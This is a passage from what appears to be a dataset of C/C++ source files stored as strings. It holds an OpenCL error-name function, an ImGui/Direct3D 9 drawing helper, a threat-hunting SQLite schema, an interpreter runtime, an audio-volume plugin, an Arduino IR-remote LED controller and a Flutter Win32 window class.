CL_MAP_FAILURE: return \"CL_MAP_FAILURE\";\n#ifdef CL_VERSION_1_1\n\tcase CL_MISALIGNED_SUB_BUFFER_OFFSET: return \"CL_MISALIGNED_SUB_BUFFER_OFFSET\";\n\tcase CL_EXEC_STATUS_ERROR_FOR_EVENTS_IN_WAIT_LIST: return \"CL_EXEC_STATUS_ERROR_FOR_EVENTS_IN_WAIT_LIST\";\n#endif\n#ifdef CL_VERSION_1_2\n\tcase CL_COMPILE_PROGRAM_FAILURE: return \"CL_COMPILE_PROGRAM_FAILURE\";\n\tcase CL_LINKER_NOT_AVAILABLE: return \"CL_LINKER_NOT_AVAILABLE\";\n\tcase CL_LINK_PROGRAM_FAILURE: return \"CL_LINK_PROGRAM_FAILURE\";\n\tcase CL_DEVICE_PARTITION_FAILED: return \"CL_DEVICE_PARTITION_FAILED\";\n\tcase CL_KERNEL_ARG_INFO_NOT_AVAILABLE: return \"CL_KERNEL_ARG_INFO_NOT_AVAILABLE\";\n#endif\n\tcase CL_INVALID_VALUE: return \"CL_INVALID_VALUE\";\n\tcase CL_INVALID_DEVICE_TYPE: return \"CL_INVALID_DEVICE_TYPE\";\n\tcase CL_INVALID_PLATFORM: return \"CL_INVALID_PLATFORM\";\n\tcase CL_INVALID_DEVICE: return \"CL_INVALID_DEVICE\";\n\tcase CL_INVALID_CONTEXT: return \"CL_INVALID_CONTEXT\";\n\tcase CL_INVALID_QUEUE_PROPERTIES: return \"CL_INVALID_QUEUE_PROPERTIES\";\n\tcase CL_INVALID_COMMAND_QUEUE: return \"CL_INVALID_COMMAND_QUEUE\";\n\tcase CL_INVALID_HOST_PTR: return \"CL_INVALID_HOST_PTR\";\n\tcase CL_INVALID_MEM_OBJECT: return \"CL_INVALID_MEM_OBJECT\";\n\tcase CL_INVALID_IMAGE_FORMAT_DESCRIPTOR: return \"CL_INVALID_IMAGE_FORMAT_DESCRIPTOR\";\n\tcase CL_INVALID_IMAGE_SIZE: return \"CL_INVALID_IMAGE_SIZE\";\n\tcase CL_INVALID_SAMPLER: return \"CL_INVALID_SAMPLER\";\n\tcase CL_INVALID_BINARY: return \"CL_INVALID_BINARY\";\n\tcase CL_INVALID_BUILD_OPTIONS: return \"CL_INVALID_BUILD_OPTIONS\";\n\tcase CL_INVALID_PROGRAM: return \"CL_INVALID_PROGRAM\";\n\tcase CL_INVALID_PROGRAM_EXECUTABLE: return \"CL_INVALID_PROGRAM_EXECUTABLE\";\n\tcase CL_INVALID_KERNEL_NAME: return \"CL_INVALID_KERNEL_NAME\";\n\tcase CL_INVALID_KERNEL_DEFINITION: return \"CL_INVALID_KERNEL_DEFINITION\";\n\tcase CL_INVALID_KERNEL: return \"CL_INVALID_KERNEL\";\n\tcase CL_INVALID_ARG_INDEX: return \"CL_INVALID_ARG_INDEX\";\n\tcase CL_INVALID_ARG_VALUE: return \"CL_INVALID_ARG_VALUE\";\n\tcase CL_INVALID_ARG_SIZE: return \"CL_INVALID_ARG_SIZE\";\n\tcase CL_INVALID_KERNEL_ARGS: return \"CL_INVALID_KERNEL_ARGS\";\n\tcase CL_INVALID_WORK_DIMENSION: return \"CL_INVALID_WORK_DIMENSION\";\n\tcase CL_INVALID_WORK_GROUP_SIZE: return \"CL_INVALID_WORK_GROUP_SIZE\";\n\tcase CL_INVALID_WORK_ITEM_SIZE: return \"CL_INVALID_WORK_ITEM_SIZE\";\n\tcase CL_INVALID_GLOBAL_OFFSET: return \"CL_INVALID_GLOBAL_OFFSET\";\n\tcase CL_INVALID_EVENT_WAIT_LIST: return \"CL_INVALID_EVENT_WAIT_LIST\";\n\tcase CL_INVALID_EVENT: return \"CL_INVALID_EVENT\";\n\tcase CL_INVALID_OPERATION: return \"CL_INVALID_OPERATION\";\n\tcase CL_INVALID_GL_OBJECT: return \"CL_INVALID_GL_OBJECT\";\n\tcase CL_INVALID_BUFFER_SIZE: return \"CL_INVALID_BUFFER_SIZE\";\n\tcase CL_INVALID_MIP_LEVEL: return \"CL_INVALID_MIP_LEVEL\";\n\tcase CL_INVALID_GLOBAL_WORK_SIZE: return \"CL_INVALID_GLOBAL_WORK_SIZE\";\n#ifdef CL_VERSION_1_1\n\tcase CL_INVALID_PROPERTY: return \"CL_INVALID_PROPERTY\";\n#endif\n#ifdef CL_VERSION_1_2\n\tcase CL_INVALID_IMAGE_DESCRIPTOR: return \"CL_INVALID_IMAGE_DESCRIPTOR\";\n\tcase CL_INVALID_COMPILER_OPTIONS: return \"CL_INVALID_COMPILER_OPTIONS\";\n\tcase CL_INVALID_LINKER_OPTIONS: return \"CL_INVALID_LINKER_OPTIONS\";\n\tcase CL_INVALID_DEVICE_PARTITION_COUNT: return \"CL_INVALID_DEVICE_PARTITION_COUNT\";\n#endif\n#ifdef CL_VERSION_2_0\n\tcase CL_INVALID_PIPE_SIZE: return \"CL_INVALID_PIPE_SIZE\";\n\tcase CL_INVALID_DEVICE_QUEUE: return \"CL_INVALID_DEVICE_QUEUE\";\n#endif\n#ifdef CL_VERSION_2_2\n\tcase CL_INVALID_SPEC_ID: return \"CL_INVALID_SPEC_ID\";\n\tcase CL_MAX_SIZE_RESTRICTION_EXCEEDED: return \"CL_MAX_SIZE_RESTRICTION_EXCEEDED\";\n#endif\n\tdefault: return \"Unknown OpenCL error (\" + std::to_string(error) + \")\";\n\t}\n}\n\n\n}\n",
    "//\n// Created by Riley on 4/25/2024.\n//\n\n#include \"drawsystem.hpp\"\n\n#include <imgui_impl_dx9.h>\n#include <imgui_impl_win32.h>\n\n#include \"link.hpp\"\n\n// Initialize the drawsystem on the first frame of present.\nvoid c_drawsystem::initialize(IDirect3DDevice9* device, HWND window) {\n  ImGui::CreateContext();\n\n  auto& io = ImGui::GetIO();\n  io.IniFilename = nullptr;\n  io.LogFilename = nullptr;\n\n  fonts::FONT_SEGOE = io.Fonts->AddFontFromFileTTF(R\"(C:\\Windows\\Fonts\\SegoeUI.ttf)\", 16.f);\n\n  io.Fonts->Build();\n\n  ImGui_ImplWin32_Init(window);\n  ImGui_ImplDX9_Init(device);\n}\n\n// Start our frame and allow drawing.\nvoid c_drawsystem::start_paint(IDirect3DDevice9* device) {\n  // Disable color correction\n  device->GetRenderState(D3DRS_SRGBWRITEENABLE, &m_prev_srgb);\n  device->SetRenderState(D3DRS_SRGBWRITEENABLE, FALSE);\n\n  // Start our frame\n  ImGui_ImplDX9_NewFrame();\n  ImGui_ImplWin32_NewFrame();\n  ImGui::NewFrame();\n}\n\n// Finish our frame and send data.\nvoid c_drawsystem::finish_paint(IDirect3DDevice9* device) {\n  // End our frame and send data\n  ImGui::Render();\n  ImGui_ImplDX9_RenderDrawData(ImGui::GetDrawData());\n\n  // Restore color correction\n  device->SetRenderState(D3DRS_SRGBWRITEENABLE, m_prev_srgb);\n}\n// TODO: add font support\n// TODO: add wstring support\nvoid c_render::string(ImDrawList* list, ImFont* font, int x, int y, bool outlined, e_text_align align,\n                      ImColor col, std::string_view input) {\n  if (input.empty()) // we have no input, don't even bother trying\n    return;\n\n  // Get the text size\n  ImVec2 size = ImGui::CalcTextSize(input.data(), nullptr, true);\n  float  left, top;\n\n  // should we remove this?\n  auto   f_x = static_cast<float>(x);\n  auto   f_y = static_cast<float>(y);\n\n  // Now run calculations\n  switch (align) {\n    case e_text_align::TEXT_LEFT: {\n      break; // Do not change anything, left is the default alignment in ImGui\n    }\n    case e_text_align::TEXT_CENTER: {\n      f_x -= size.x / 2; // move the text left by half of the size of the string\n      break;\n    }\n    case e_text_align::TEXT_RIGHT: {\n      f_x -= size.x; // move the text left by the entire size of the string\n      break;\n    }\n    default:\n      break;\n  }\n\n  // https://github.com/ocornut/imgui/issues/745\n  if (outlined) {\n    if (ctx->get_render_state()) {\n      left = f_x + 1.f;\n      top = f_y + 1.f;\n      list->AddText(font, 0.f, {left, top}, ImColor(0.f, 0.f, 0.f, col.Value.w), input.data(), nullptr);\n    } else { // Because ImGui has no native method of doing outlines, we must draw the same text\n             // four times to achieve an outline. If the user has optimized rendering on, then the\n             // text will be a drop shadow instead of a full outline.\n      left = f_x;\n      top = f_y + 1.f;\n      list->AddText(font, 0.f, {left, top}, ImColor(0.f, 0.f, 0.f, col.Value.w), input.data(), nullptr);\n      left = f_x + 1.f;\n      top = f_y;\n      list->AddText(font, 0.f, {left, top}, ImColor(0.f, 0.f, 0.f, col.Value.w), input.data(), nullptr);\n      left = f_x - 1.f;\n      top = f_y;\n      list->AddText(font, 0.f, {left, top}, ImColor(0.f, 0.f, 0.f, col.Value.w), input.data(), nullptr);\n      left = f_x;\n      top = f_y - 1.f;\n      list->AddText(font, 0.f, {left, top}, ImColor(0.f, 0.f, 0.f, col.Value.w), input.data(), nullptr);\n    }\n  }\n  left = f_x;\n  top = f_y;\n  list->AddText(font, 0.f, {left, top}, col, input.data(), nullptr);\n}\n\nvoid c_render::circle(ImDrawList* list, int x, int y, float rad, bool outlined, ImColor col) {\n  auto f_x = static_cast<float>(x);\n  auto f_y = static_cast<float>(y);\n\n  if (outlined && !ctx->get_render_state()) {\n    list->AddCircle({f_x, f_y}, rad - 1.f, ImColor(0.f, 0.f, 0.f, col.Value.w));\n    list->AddCircle({f_x, f_y}, rad + 1.f, ImColor(0.f, 0.f, 0.f, col.Value.w));\n  }\n  list->AddCircle({f_x, f_y}, rad, col);\n}\n\nvoid c_render::box(ImDrawList* list, int x, int y, int w, int h, bool outlined, ImColor col) {\n  // lol\n  auto f_x = static_cast<float>(x);\n  auto f_y = static_cast<float>(y);\n  auto f_w = static_cast<float>(w);\n  auto f_h = static_cast<float>(h);\n\n  if (outlined) {\n    list->AddRect({f_x + 1.f, f_y + 1.f}, {f_x + f_w - 1.f, f_y + f_h - 1.f},\n                  ImColor(0.f, 0.f, 0.f, col.Value.w));\n    list->AddRect({f_x - 1.f, f_y - 1.f}, {f_x + f_w + 1.f, f_y + f_h + 1.f},\n                  ImColor(0.f, 0.f, 0.f, col.Value.w));\n  }\n  list->AddRect({f_x, f_y}, {f_x + f_w, f_y + f_h}, col);\n}\n\nvoid c_render::filled_box(ImDrawList* list, int x, int y, int w, int h, ImColor col) {\n  // lol\n  auto f_x = static_cast<float>(x);\n  auto f_y = static_cast<float>(y);\n  auto f_w = static_cast<float>(w);\n  auto f_h = static_cast<float>(h);\n\n  list->AddRectFilled({f_x + 1.f, f_y + 1.f}, {f_x + f_w + 1.f, f_y + f_h + 1.f}, col);\n}\n\n// TODO: outline support\nvoid c_render::line(ImDrawList* list, int x1, int y1, int x2, int y2, ImColor col) {\n  auto f_x1 = (float)x1;\n  auto f_y1 = (float)y1;\n  auto f_x2 = (float)x2;\n  auto f_y2 = (float)y2;\n\n  list->AddLine({f_x",
    "#include \"database.h\"\n#include <chrono>\n#include <ctime>\n#include <iomanip>\n#include <direct.h>\n#include <sstream>\n#include <fstream>\n\n#include \"Common.h\"\n\n#define HASH_MUTEX  L\"4EB9644E0AE299BAC5DBCC4440C066E6\"\n\n#define DB_VERSION \"Thread_hunting_ver1\"\n\nnamespace sql\n{\n    static std::list<std::string> list_dir(const std::string& path, bool recursive)\n    {\n        std::list<std::string> ret;\n\n        // check if path is directory\n        DWORD dwAttr = GetFileAttributesA(path.c_str());\n        if (dwAttr == INVALID_FILE_ATTRIBUTES ||\n            (dwAttr & FILE_ATTRIBUTE_DIRECTORY) == 0)\n            return ret;\n\n        WIN32_FIND_DATAA FindFileData;\n        std::string mask = (path.back() == '\\\\') ? path + '*' : path + \"\\\\*\";\n        HANDLE hFind = FindFirstFileA(mask.c_str(), &FindFileData);\n        if (hFind == INVALID_HANDLE_VALUE)\n            return ret;\n        do\n        {\n            if (lstrcmpA(FindFileData.cFileName, \".\") == 0 || lstrcmpA(FindFileData.cFileName, \"..\") == 0)\n                continue;\n            std::string sub_path = (path.back() == '\\\\') ? path + FindFileData.cFileName : path + \"\\\\\" + FindFileData.cFileName;\n            if (!(FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))\n                ret.push_back(sub_path);\n\n            if (recursive && FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)\n            {\n                for (auto &p : list_dir(sub_path, recursive))\n                    ret.push_back(p);\n            }\n        } while (FindNextFileA(hFind, &FindFileData));\n        FindClose(hFind);\n\n        return ret;\n    }\n\n    static bool is_existed(const std::string& name) {\n        std::ifstream f(name.c_str());\n        return f.good();\n    }\n\n    static bool is_valid_db(sql::sqlite* data_object)\n    {\n        auto version = data_object->search(\"SELECT * FROM VERSION\");\n        auto& x = version.back();\n        if (x[\"version\"].find(DB_VERSION) != std::string::npos)\n            return true;\n        return false;\n    }\n\n    static void init_table(sql::sqlite* db_object)\n    {\n        db_object->begin_transaction();\n\n        // Create table file\n        db_object->exec(R\"(CREATE TABLE IF NOT EXISTS FILE (id INTEGER PRIMARY KEY NOT NULL, \n            file_name TEXT COLLATE NOCASE,\n            file_path TEXT COLLATE NOCASE, \n            file_hash_md5 TEXT COLLATE NOCASE, \n            file_hash_sha256 TEXT COLLATE NOCASE, \n            file_hash_sha1 TEXT COLLATE NOCASE, \n            file_signature TEXT COLLATE NOCASE, \n            created_time INTEGER,\n            modified_time INTEGER);)\");\n        db_object->exec(\"CREATE INDEX IF NOT EXISTS 'IdxNode_File' ON FILE(file_path, file_name, file_signature);\");\n\n        // Create table registry\n        db_object->exec(\"CREATE TABLE IF NOT EXISTS REGISTRY (id INTEGER PRIMARY KEY NOT NULL, reg_path TEXT, reg_key TEXT, reg_value TEXT, created_time INTEGER, modified_time INTEGER, detected_time INTEGER);\");\n        db_object->exec(\"CREATE INDEX IF NOT EXISTS 'IdxNode_Registry' ON REGISTRY(reg_path, reg_key);\");\n\n        // Create table network\n        db_object->exec(\"CREATE TABLE IF NOT EXISTS NETWORK (id INTEGER PRIMARY KEY NOT NULL, target_ip TEXT, target_domain TEXT, process_id INTEGER, process_path TEXT, connected_time INTEGER);\");\n        db_object->exec(\"CREATE INDEX IF NOT EXISTS 'IdxNode_Network' ON NETWORK(target_ip, process_id);\");\n\n        // Create table process\n        db_object->exec(\"CREATE TABLE IF NOT EXISTS PROCESS (id INTEGER PRIMARY KEY NOT NULL, parent_process_path TEXT, parent_process_id INTEGER, parent_cmdline TEXT, process_path TEXT, process_id INTEGER, cmdline TEXT, user_name TEXT, integrity TEXT, start_time INTEGER, end_time INTEGER);\");\n        db_object->exec(\"CREATE INDEX IF NOT EXISTS 'IdxNode_Process' ON PROCESS(process_path, process_id);\");\n\n        //Create table version\n        db_object->exec(\"CREATE TABLE IF NOT EXISTS VERSION (id INTEGER PRIMARY KEY NOT NULL, version TEXT);\");\n        db_object->exec(nstd::format(\"INSERT INTO VERSION(version) VALUES('%s');\", DB_VERSION));\n\n        db_object->commit_transaction();\n    }\n\n    // return formatted date: YYYYmm\n    static std::string get_date()\n    {\n        auto now = std::chrono::system_clock::now();\n        std::time_t now_time = std::chrono::system_clock::to_time_t(now);\n        std::tm timeinfo;\n        localtime_s(&timeinfo, &now_time);\n        std::stringstream ss;\n        ss << std::put_time(&timeinfo, \"%y%m\");\n        std::string formatted_date = ss.str();\n        return formatted_date;\n    }\n\n    void database::lock_db() \n    {\n        if (WaitForSingleObject(_mutex, 30 * 1000) == WAIT_TIMEOUT)\n            throw std::runtime_error(\"cannot access to db now\");\n    }\n\n    void database::unlock_db() \n    {\n        if (ReleaseMutex(_mutex) == FALSE) \n            throw std::runtime_error(\"cannot release mutex\");\n    }\n\n    database::database(const std::string& db_dir, bool read_only) : \n        _path(db_dir)\n    {\n        bool success",
    "#include <iostream>\n#include <string>\n#include <cstring>\n\n#include <parser/parser.hpp>\n#include <ve/ve.hpp>\n\nusing std::uint32_t;\n\nbool is_number(const std::string& s);\n\nvoid HSharpVE::VirtualEnvironment::exec_expression(const HSharpParser::NodeExpression* expr) {\n    std::visit(exprvisitor, expr->expr);\n}\n\nvoid HSharpVE::VirtualEnvironment::exec_statement(const HSharpParser::NodeStmt* stmt) {\n    std::visit(stmtvisitor, stmt->statement);\n}\n\nvoid HSharpVE::VirtualEnvironment::delete_variables() {\n    for (auto pair : global_scope.variables) {\n        switch (pair.second.vtype) {\n            case VariableType::INT: integers_pool.free(static_cast<int64_t*>(pair.second.value)); break;\n            case VariableType::STRING: strings_pool.free(pair.second.value); break;\n            default:\n                std::printf(\"Cannot dispose variable %s: unknown type, freeing impossible\", pair.first.c_str());\n        }\n    }\n    global_scope.variables.clear();\n}\n\nbool HSharpVE::VirtualEnvironment::is_variable(char* name) {\n    auto it = std::find_if(std::begin(global_scope.variables), std::end(global_scope.variables), [name](auto&& arg) {\n        return !strcmp(arg.first.c_str(), name);\n    });\n    return it != std::end(global_scope.variables);\n}\n\nbool HSharpVE::VirtualEnvironment::is_variable_value(void* value) {\n    auto it = std::find_if(std::begin(global_scope.variables),\n        std::end(global_scope.variables), [value](auto&& arg) {\n            return arg.second.value == value;\n        });\n    return it != std::end(global_scope.variables);\n}\n\nvoid HSharpVE::VirtualEnvironment::dispose_value(ExpressionVisitorRetPair& data) {\n    if (!data.dealloc_required) return;\n    switch (data.type) {\n        case VariableType::INT: integers_pool.free(static_cast<int64_t*>(data.value)); break;\n        case VariableType::STRING: strings_pool.free(data.value); break;\n        default: std::terminate();\n    }\n}\n\nvoid HSharpVE::VirtualEnvironment::run() {\n    global_scope = {};\n    for (const HSharpParser::NodeStmt* stmt : root.statements) {\n        exec_statement(stmt);\n    }\n}\n\nbool HSharpVE::VirtualEnvironment::is_number(const std::string& s) {\n    std::string::const_iterator it = s.begin();\n    while (it != s.end() && std::isdigit(*it)) ++it;\n    return !s.empty() && it == s.end();\n}",
    "\ufeff#include <windows.h>\r\n#include <algorithm>\r\n#include <exedit.hpp>\r\n\r\nstatic char name[] = \"\u97f3\u91cf\";\r\n\r\nconstexpr int track_n = 4;\r\nstatic char* track_name[track_n] = { const_cast<char*>(\"\u97f3\u91cf\"), const_cast<char*>(\"\u5de6\u53f3\"), const_cast<char*>(\"\u97f3\u91cf-\u5de6\"), const_cast<char*>(\"\u97f3\u91cf-\u53f3\") };\r\nstatic int track_default[track_n] = { 1000, 0, 1000, 1000 };\r\nstatic int track_s[track_n] = { 0, -1000, 0, 0 };\r\nstatic int track_e[track_n] = { 5000, 1000, 5000, 5000 };\r\nstatic int track_scale[track_n] = { 10, 10, 10, 10 };\r\n\r\nconstexpr int check_n = 0;\r\n\r\nBOOL func_proc(ExEdit::Filter* efp, ExEdit::FilterProcInfo* efpip) {\r\n\r\n    int volume = (max(0, efp->track[0]) << 9) / 125;\r\n    int left = max(0, efp->track[2]) * volume / 1000;\r\n    int right = max(0, efp->track[3]) * volume / 1000;\r\n\r\n    if (2 <= efpip->audio_ch) {\r\n        int lr = std::clamp(efp->track[1], efp->track_s[1], efp->track_e[1]);\r\n        if (lr < 0) {\r\n            right = right * (lr + 1000) / 1000;\r\n        } else if (0 < lr) {\r\n            left = left * (1000 - lr) / 1000;\r\n        }\r\n    }\r\n    short* audiop;\r\n    if ((byte)efp->flag & (byte)(ExEdit::Filter::Flag::Effect)) {\r\n        audiop = efpip->audio_data;\r\n    } else {\r\n        audiop = efpip->audio_p;\r\n    }\r\n\r\n    switch (efpip->audio_ch) {\r\n    case 1: {\r\n        for (int i = efpip->audio_n; 0 < i; i--) {\r\n            *audiop = std::clamp(*audiop * volume >> 12, SHRT_MIN, SHRT_MAX);\r\n            audiop++;\r\n        }\r\n    }break;\r\n    case 2: {\r\n        for (int i = efpip->audio_n; 0 < i; i--) {\r\n            *audiop = std::clamp(*audiop * left >> 12, SHRT_MIN, SHRT_MAX);\r\n            audiop++;\r\n            *audiop = std::clamp(*audiop * right >> 12, SHRT_MIN, SHRT_MAX);\r\n            audiop++;\r\n        }\r\n    }break;\r\n    default: {\r\n        for (int i = efpip->audio_n; 0 < i; i--) {\r\n            *audiop = std::clamp(*audiop * left >> 12, SHRT_MIN, SHRT_MAX);\r\n            audiop++;\r\n            *audiop = std::clamp(*audiop * right >> 12, SHRT_MIN, SHRT_MAX);\r\n            audiop++;\r\n            for (int j = efpip->audio_ch - 2; 0 < j; j--) {\r\n                *audiop = std::clamp(*audiop * volume >> 12, SHRT_MIN, SHRT_MAX);\r\n                audiop++;\r\n            }\r\n        }\r\n    }break;\r\n    }\r\n\r\n    return TRUE;\r\n}\r\n\r\nExEdit::Filter effect_ef = {\r\n    .flag = ExEdit::Filter::Flag::Audio | ExEdit::Filter::Flag::Effect,\r\n    .name = name,\r\n    .track_n = track_n,\r\n    .track_name = track_name,\r\n    .track_default = track_default,\r\n    .track_s = track_s,\r\n    .track_e = track_e,\r\n    .check_n = check_n,\r\n    .func_proc = &func_proc,\r\n    .track_scale = track_scale,\r\n};\r\nExEdit::Filter filter_ef = {\r\n    .flag = ExEdit::Filter::Flag::Audio,\r\n    .name = name,\r\n    .track_n = track_n,\r\n    .track_name = track_name,\r\n    .track_default = track_default,\r\n    .track_s = track_s,\r\n    .track_e = track_e,\r\n    .check_n = check_n,\r\n    .func_proc = &func_proc,\r\n    .track_scale = track_scale,\r\n};\r\nExEdit::Filter* filter_list[] = {\r\n    &effect_ef, &filter_ef,\r\n    NULL\r\n};\r\nEXTERN_C __declspec(dllexport)ExEdit::Filter** __stdcall GetFilterTableList() {\r\n    return filter_list;\r\n}\r\n",
    "#include <Arduino.h>\r\n#include <IRremote.hpp>\r\n\r\n#define IR_RECEIVE_PIN 12 // Pin pro receiver ovlada\u010de\r\n#define ENTER 4127850240 // K\u00f3d kl\u00e1vesy ENTER\r\n#define redLed 5 // Pin pro barvu \u010dervenou\r\n#define greenLed 6 // Pin pro barvu zelenou\r\n#define blueLed 9 // Pin pro barvu modrou\r\n\r\nunsigned long codes[] = {\r\n    3910598400, // 0\r\n    4077715200, // 1\r\n    3877175040, // 2\r\n    2707357440, // 3\r\n    4144561920, // 4\r\n    3810328320, // 5\r\n    2774204160, // 6\r\n    3175284480, // 7\r\n    2907897600, // 8\r\n    3041591040, // 9\r\n};\r\n\r\nString stringNum = \"\";\r\nint currentLED = 0; // 0 = red, 1 = green, 2 = blue\r\n\r\nint codesSize = sizeof(codes) / sizeof(codes[0]); // Zji\u0161t\u011bn\u00ed po\u010dtu prvk\u016f v poli codes\r\n\r\nString receivedNum(unsigned long irData) {\r\n    for (int i = 0; i < codesSize; i++) { // Kontroluje pouze k\u00f3dy 0-9\r\n        if (irData == codes[i]) {\r\n            return String(i);\r\n        }\r\n    }\r\n    return \"\"; // Pokud k\u00f3d neodpov\u00edd\u00e1 \u017e\u00e1dn\u00e9mu \u010d\u00edslu, vr\u00e1t\u00ed pr\u00e1zdn\u00fd \u0159et\u011bzec\r\n}\r\n\r\nvoid setLED(int value) { //Funkce pro vr\u00e1cen\u00ed intenzity sv\u00edcen\u00ed ledky\r\n    switch (currentLED) { //Podle vybran\u00e9 ledky\r\n        case 0:\r\n            analogWrite(redLed, value);\r\n            Serial.print(\"\u010cerven\u00e1 LED: \");\r\n            Serial.println(value);\r\n            break;\r\n        case 1:\r\n            analogWrite(greenLed, value);\r\n            Serial.print(\"Zelen\u00e1 LED: \");\r\n            Serial.println(value);\r\n            break;\r\n        case 2:\r\n            analogWrite(blueLed, value);\r\n            Serial.print(\"Modr\u00e1 LED: \");\r\n            Serial.println(value);\r\n            break;\r\n    }\r\n}\r\n\r\nvoid setup() {\r\n    IrReceiver.begin(IR_RECEIVE_PIN, ENABLE_LED_FEEDBACK); // Inicializace p\u0159ij\u00edma\u010de\r\n    Serial.begin(9600); // Inicializace seriov\u00e9 komunikace\r\n    //Inicializace ledek\r\n    pinMode(redLed, OUTPUT);\r\n    pinMode(greenLed, OUTPUT);\r\n    pinMode(blueLed, OUTPUT);\r\n}\r\n\r\nvoid loop() {\r\n    if (IrReceiver.decode()) { // Kontrola, zda p\u0159i\u0161la data z p\u0159ij\u00edma\u010de\r\n        unsigned long irData = IrReceiver.decodedIRData.decodedRawData; // Ulo\u017een\u00ed k\u00f3du z p\u0159ij\u00edma\u010de do irData\r\n        if (irData > 0) { // Kontrola fale\u0161n\u00fdch k\u00f3d\u016f\r\n            Serial.print(irData); // V\u00fdpis k\u00f3du na seriovou linku\r\n            Serial.print(\",\");\r\n            if (irData == ENTER) { // Pokud je zm\u00e1\u010dknut ENTER\r\n                int intNum = stringNum.toInt(); // P\u0159etypov\u00e1n\u00ed String na int\r\n                if (intNum >= 0 && intNum <= 255) { // Kontrola rozsahu vstupn\u00edho \u010d\u00edsla\r\n                    setLED(intNum);\r\n                    Serial.print(\"Nastaven\u00e1 hodnota: \");\r\n                    Serial.println(intNum); // V\u00fdpis nastaven\u00e9 hodnoty do Serial monitoru\r\n                    stringNum = \"\"; // Vy\u010di\u0161t\u011bn\u00ed nast\u0159\u00e1dan\u00e9ho \u010d\u00edsla\r\n                } else {\r\n                    Serial.println(\"Mimo rozsah\");\r\n                    stringNum = \"\"; // Vy\u010di\u0161t\u011bn\u00ed nast\u0159\u00e1dan\u00e9ho \u010d\u00edsla\r\n                }\r\n            } else if (irData == 3125149440) { // K\u00f3d pro \u010dervenou LED\r\n                currentLED = 0;\r\n                Serial.println(\"Vybr\u00e1na \u010derven\u00e1 LED\");\r\n            } else if (irData == 3108437760) { // K\u00f3d pro zelenou LED\r\n                currentLED = 1;\r\n                Serial.println(\"Vybr\u00e1na zelen\u00e1 LED\");\r\n            } else if (irData == 3091726080) { // K\u00f3d pro modrou LED\r\n                currentLED = 2;\r\n                Serial.println(\"Vybr\u00e1na modr\u00e1 LED\");\r\n            } else { // Funkce pro st\u0159\u00e1d\u00e1n\u00ed \u010d\u00edsel\r\n                stringNum += receivedNum(irData);\r\n                Serial.println(stringNum); // V\u00fdpis aktu\u00e1ln\u00edho nast\u0159\u00e1dan\u00e9ho \u010d\u00edsla do Serial monitoru\r\n            }\r\n        }\r\n\r\n        IrReceiver.resume(); // Povolen\u00ed p\u0159ij\u00edm\u00e1n\u00ed dal\u0161\u00edho sign\u00e1lu\r\n    }\r\n}\r\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      